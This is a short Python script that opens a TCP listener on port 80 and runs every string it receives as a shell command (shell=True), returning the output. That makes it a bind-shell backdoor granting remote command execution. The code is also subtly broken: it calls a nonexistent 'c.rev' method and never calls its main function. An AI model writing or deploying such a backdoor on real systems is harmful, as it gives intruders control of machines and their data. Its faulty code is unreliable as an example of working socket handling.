import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#protocolo IPv4 e TCP

host = '192.168.15.15'
port = 80

def receivedSender(c):
    received = c.rev(1024)
    process = subprocess.check_output(received.decode('utf-8'), shell=True, universal_newlines=True)
    c.sendall(process.encode('utf-8'))

def main(host,port,s):
    
    s.bind((host,port))
    s.listen(1)

    c,e = s.accept()
    print(f'Connection to: {e}')

    while True:
        receivedSender(c)

    c.close()
    s.close()